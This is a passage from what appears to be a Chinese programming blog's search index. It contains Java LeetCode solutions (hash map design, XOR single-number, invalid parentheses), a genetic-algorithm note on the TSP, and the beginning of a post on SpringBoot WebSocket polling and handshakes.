class="line">        <span class="keyword">return</span> nums[key%<span class="number">1000001</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        nums[key%<span class="number">1000001</span>]=-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyHashMap object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyHashMap obj = new MyHashMap();</span></span><br><span class="line"><span class="comment"> * obj.put(key,value);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.get(key);</span></span><br><span class="line"><span class="comment"> * obj.remove(key);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h1 id="2-使用数组链表法"><a href="#2-使用数组链表法" class="headerlink" title="2.使用数组链表法"></a>2.使用数组链表法</h1><p>使用一个链表数组，每一个hash(key)代表数组的索引；并new KeytoValue这个类去存放key、value；</p><p>需要注意存放相同的key值的时候需要remove(key)防止key值相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashMap</span> </span>&#123;</span><br><span class="line">    <span class="comment">//new 一个存放这个的链表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">keytoValue</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> key;</span><br><span class="line">        <span class="keyword">int</span> value;</span><br><span class="line">        keytoValue(<span class="keyword">int</span> key,<span class="keyword">int</span> value)&#123;</span><br><span class="line">            <span class="keyword">this</span>.key=key;<span class="keyword">this</span>.value=value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> base=<span class="number">769</span>;</span><br><span class="line">    LinkedList&lt;keytoValue&gt;[] linked=<span class="keyword">new</span> LinkedList[base];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;base;i++)&#123;</span><br><span class="line">            linked[i]=<span class="keyword">new</span> LinkedList&lt;keytoValue&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        keytoValue cur=<span class="keyword">new</span> keytoValue(key,value);</span><br><span class="line">        <span class="keyword">int</span> index=hash(key);</span><br><span class="line">        remove(key);</span><br><span class="line">        linked[index].add(cur);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index=hash(key);</span><br><span class="line">        <span class="keyword">for</span>(keytoValue tmp:linked[index])&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp.key==key)&#123;</span><br><span class="line">                <span class="keyword">return</span> tmp.value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用迭代器去删除掉</span></span><br><span class="line">        <span class="keyword">int</span> index=hash(key);</span><br><span class="line">        Iterator&lt;keytoValue&gt; it = linked[index].iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            keytoValue tmp = it.next();</span><br><span class="line">            <span class="keyword">if</span>(tmp.key==key)&#123;</span><br><span class="line">                it.remove();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value%base;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/11/01/LeetCode/Leetcode706-%E8%AE%BE%E8%AE%A1hash%E6%98%A0%E5%B0%84/image-20211101162435249.png" class="lazyload" data-srcset="/2021/11/01/LeetCode/Leetcode706-%E8%AE%BE%E8%AE%A1hash%E6%98%A0%E5%B0%84/image-20211101162435249.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211101162435249" style="zoom:50%;">]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode136-260-找出只出现过一次的数字</title>
      <link href="/2021/10/30/LeetCode/Leetcode136-260-%E6%89%BE%E5%87%BA%E5%8F%AA%E5%87%BA%E7%8E%B0%E8%BF%87%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/"/>
      <url>/2021/10/30/LeetCode/Leetcode136-260-%E6%89%BE%E5%87%BA%E5%8F%AA%E5%87%BA%E7%8E%B0%E8%BF%87%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h4 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode-cn.com/problems/single-number/">136. 只出现一次的数字</a></h4><h4 id="260-只出现一次的数字-III"><a href="#260-只出现一次的数字-III" class="headerlink" title="260. 只出现一次的数字 III"></a><a href="https://leetcode-cn.com/problems/single-number-iii/">260. 只出现一次的数字 III</a></h4><p>两道题目都是找只出现过一次的数字，最简单的方式就是使用hashset直接判定是否已经存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//260题解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] singleNumber(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        Set&lt;Integer&gt; set=<span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set.contains(nums[i]))&#123;</span><br><span class="line">                set.remove(nums[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                set.add(nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Integer i:set)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp==<span class="number">0</span>)&#123;</span><br><span class="line">                res[<span class="number">0</span>]=i;</span><br><span class="line">                tmp++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res[<span class="number">1</span>]=i;</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="使用异或解决"><a href="#使用异或解决" class="headerlink" title="使用异或解决"></a>使用异或解决</h1><p>因为两个相同的数异或的结果是0，而任何数与0异或不会改变，所以，对于136题来说，数组中只有一个出现过一次，而其他数都是出现过两次，可以通过对整个数组进行遍历异或，最后的结果就是只出现过一次的数字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//136最简单的异或解法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans = nums[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (nums.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">      ans = ans ^ nums[i];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于260题来说，求的是两个出现过一次的数字</p><p>按照136题来说异或完的结果为两个出现过一次的数字之和，此时需要将数字分开</p><p><strong>基础运算</strong></p><p><code>3: 0000 0011 </code>^<code>5: 0000 0101</code> =&gt; <code>3^5: 0000 0110</code> 此时结果为6是3和5的异或和</p><p>要将两个数分开需要找出两个数字不同的地方，此处找的是最低位不同的地方，也就是第二位，3为0，5为1</p><p><code>6: 0000 0110</code>&amp;<code>-6 1111 1010</code>=&gt; <code>3&amp;-6: 0000 0010</code> 结果2即是不同的位置</p><p>对于nums整个数组来说，第二位为0,1可以将数组分成两类，而出现过两次的数字则为被归为同一类，所以只要对单独的一组进行异或就能到最后的两个解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] singleNumber(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> xorsum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            xorsum ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 防止溢出</span></span><br><span class="line">        <span class="comment">//如果最后的结果是-2^31，进行取反的话溢出正数位置；最高位就是最低位不同的</span></span><br><span class="line">        <span class="keyword">int</span> lsb = (xorsum == Integer.MIN_VALUE ? xorsum : xorsum &amp; (-xorsum));</span><br><span class="line">        <span class="keyword">int</span> type1 = <span class="number">0</span>, type2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((num &amp; lsb) != <span class="number">0</span>) &#123;</span><br><span class="line">                type1 ^= num;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                type2 ^= num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;type1, type2&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-接口</title>
      <link href="/2021/10/29/Java/java-%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/10/29/Java/java-%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-集合类</title>
      <link href="/2021/10/29/Java/Java-%E9%9B%86%E5%90%88%E7%B1%BB/"/>
      <url>/2021/10/29/Java/Java-%E9%9B%86%E5%90%88%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode301-删除无效的括号</title>
      <link href="/2021/10/27/LeetCode/LeetCode301-%E5%88%A0%E9%99%A4%E6%97%A0%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/"/>
      <url>/2021/10/27/LeetCode/LeetCode301-%E5%88%A0%E9%99%A4%E6%97%A0%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-回溯"><a href="#1-回溯" class="headerlink" title="1.回溯"></a>1.回溯</h1><p>1.先判断需要删除的左括号以及有括号，遍历一次 得出lremove、remove</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> lrmove=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> rrmove=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.charAt(i)==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">        lrmove++;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.charAt(i)==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(lrmove&gt;<span class="number">0</span>)</span><br><span class="line">            lrmove--;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            rrmove++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.使用递归回溯必须先考虑结束的条件，此处的递归是不断删除左括号或者右括号，结束的条件应该为lremove==0&amp;&amp;rremove==0，然后判断当前的字符串是否满足条件，满足条件的应该为左括号以及右括号的数量相同，参照函数<code>public boolean is_valid(String s)</code></p><p>3.一个for循环去遍历其中的字符，从start开始，其中有两个条件可以提前结束循环，第一个是lremove+rrmove的长度大于字符串的长度，另一个是右括号的数量大于左括号的数量</p><h1 id="2-广度优先搜索"><a href="#2-广度优先搜索" class="headerlink" title="2.广度优先搜索"></a>2.广度优先搜索</h1><p>主要是用一个hashset去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public List&lt;String&gt; removeInvalidParentheses(String s) &#123;</span><br><span class="line">       List&lt;String&gt; ans = new ArrayList&lt;String&gt;();</span><br><span class="line">        Set&lt;String&gt; currSet = new HashSet&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        currSet.add(s);</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            for (String str : currSet) &#123;</span><br><span class="line">                if (isValid(str)) &#123;</span><br><span class="line">                    ans.add(str);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (ans.size() &gt; 0) &#123;</span><br><span class="line">                return ans;</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;String&gt; nextSet = new HashSet&lt;String&gt;();</span><br><span class="line">            for (String str : currSet) &#123;</span><br><span class="line">                for (int i = 0; i &lt; str.length(); i ++) &#123;</span><br><span class="line">                    if (i &gt; 0 &amp;&amp; str.charAt(i) == str.charAt(i - 1)) &#123;</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (str.charAt(i) == &#x27;(&#x27; || str.charAt(i) == &#x27;)&#x27;) &#123;</span><br><span class="line">                        nextSet.add(str.substring(0, i) + str.substring(i + 1));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            currSet = nextSet;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    private boolean isValid(String str) &#123;</span><br><span class="line">        char[] ss = str.toCharArray();</span><br><span class="line">        int count = 0;</span><br><span class="line"></span><br><span class="line">        for (char c : ss) &#123;</span><br><span class="line">            if (c == &#x27;(&#x27;) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; else if (c == &#x27;)&#x27;) &#123;</span><br><span class="line">                count--;</span><br><span class="line">                if (count &lt; 0) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return count == 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">is_vaild</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">    <span class="comment">//判断当前的的字符串是否合法，如果左括号</span></span><br><span class="line">    <span class="keyword">int</span> lcount=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str.charAt(i)==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            lcount++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(str.charAt(i)==<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">            lcount--;</span><br><span class="line">        <span class="keyword">if</span>(lcount&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lcount==<span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSP问题</title>
      <link href="/2021/10/25/%E7%AE%97%E6%B3%95/TSP%E9%97%AE%E9%A2%98/"/>
      <url>/2021/10/25/%E7%AE%97%E6%B3%95/TSP%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="TSP问题的遗传算法"><a href="#TSP问题的遗传算法" class="headerlink" title="TSP问题的遗传算法"></a>TSP问题的遗传算法</h1><p>遗传算法的主体部分：</p><p>选择、交叉、编译</p><img src="/2021/10/25/%E7%AE%97%E6%B3%95/TSP%E9%97%AE%E9%A2%98/image-20211027182345982.png" class="lazyload" data-srcset="/2021/10/25/%E7%AE%97%E6%B3%95/TSP%E9%97%AE%E9%A2%98/image-20211027182345982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211027182345982" style="zoom:50%;"><p>在每一代中，根据问题中个体的适应性大小，选择个体，并借助遗传算子进行组合交叉和变异，产生出代表新的解集的种群。<br>遗传算法中有选择算子、交叉算子和变异算子。</p><h2 id="选择算子"><a href="#选择算子" class="headerlink" title="选择算子"></a>选择算子</h2><p>选择算子用于在父代种群中选择进入下一代的个体，有轮盘赌选择、锦标赛选择等。这里保留父代中<strong>适应性最佳</strong>的个体进入下一代，其余按照轮盘赌选择进入下一代</p><h2 id="交叉算子"><a href="#交叉算子" class="headerlink" title="交叉算子"></a>交叉算子</h2><p>交叉算子用于对种群中的个体两两进行交叉，有部分映射交叉、顺序交叉、基于位置交叉等交叉算子。这里采用基于位置交叉算子。算法采用顺序交叉算子。</p><p>交叉操作就是在选取的父代个体中随机选取交叉位点，交换这两个个体交叉位点之间的序列，得到两个序列，再通过冲突调整，得到新的子代个体，然后加入到新的子代种群中。</p><h2 id="变异算子"><a href="#变异算子" class="headerlink" title="变异算子"></a>变异算子</h2><p>变异算子用于对种群中的个体进行突变。算法中多次随机选取两个位置基因进行交换。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习-感知机</title>
      <link href="/2021/10/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%84%9F%E7%9F%A5%E6%9C%BA/"/>
      <url>/2021/10/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%84%9F%E7%9F%A5%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot-WebSocket</title>
      <link href="/2021/10/19/SpringBoot/SpringBoot-WebSocket/"/>
      <url>/2021/10/19/SpringBoot/SpringBoot-WebSocket/</url>
      
        <content type="html"><![CDATA[<h1 id="引入WebSocket之前"><a href="#引入WebSocket之前" class="headerlink" title="引入WebSocket之前"></a>引入WebSocket之前</h1><img src="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019124501310.png" class="lazyload" data-srcset="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019124501310.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211019124501310" style="zoom:50%;"><h2 id="短轮询"><a href="#短轮询" class="headerlink" title="短轮询"></a>短轮询</h2><p>短轮询是指客户端每隔一段时间就询问一次服务器是否有新的消息，如果有就接收消息。这样方式会增加很多次无意义的发送请求信息，每次都会耗费流量及处理器资源。</p><h2 id="长轮询"><a href="#长轮询" class="headerlink" title="长轮询"></a>长轮询</h2><p>长轮询是短轮询的改进，客户端执行 HTTP 请求发送消息到服务器后，等待服务器回应，如果没有新的消息就一直等待，知道服务器有新消息传回或者超时。这也是个反复的过程，这种做法只是减小了网络带宽和处理器的消耗，但是带来的问题是导致消息实时性低，延迟严重。而且也是基于循环，最根本的带宽及处理器资源占用并没有得到有效的解决。</p><h2 id="服务器发送事件"><a href="#服务器发送事件" class="headerlink" title="服务器发送事件"></a>服务器发送事件</h2><img src="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019124707412.png" class="lazyload" data-srcset="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019124707412.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211019124707412" style="zoom:50%;"><h1 id="WebSocket的连接过程"><a href="#WebSocket的连接过程" class="headerlink" title="WebSocket的连接过程"></a>WebSocket的连接过程</h1><h3 id="客户端先用带有-Upgrade-Websocket-请求头的-HTTP-请求，向服务器端发起连接请求，实现握手-HandShake"><a href="#客户端先用带有-Upgrade-Websocket-请求头的-HTTP-请求，向服务器端发起连接请求，实现握手-HandShake" class="headerlink" title="客户端先用带有 Upgrade:Websocket 请求头的 HTTP 请求，向服务器端发起连接请求，实现握手(HandShake)"></a><strong>客户端先用带有 Upgrade:Websocket 请求头的 HTTP 请求，向服务器端发起连接请求，实现握手(HandShake)</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//客户端请求的Http的header信息</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Extensions</span><span class="punctuation">: </span>permessage-deflate; client_max_window_bits</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>IRQYhWINfX5Fh1zdocDl6Q==</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure><img src="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019124901384.png" class="lazyload" data-srcset="/2021/10/19/SpringBoot/SpringBoot-WebSocket/image-20211019124901384.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211019124901384" style="zoom:67%;"><h3 id="握手成功后，由-HTTP-协议升级成-Websocket-协议，进行长连接通信，两端相互传递信息。"><a href="#握手成功后，由-HTTP-协议升级成-Websocket-协议，进行长连接通信，两端相互传递信息。" class="headerlink" title="握手成功后，由 HTTP 协议升级成 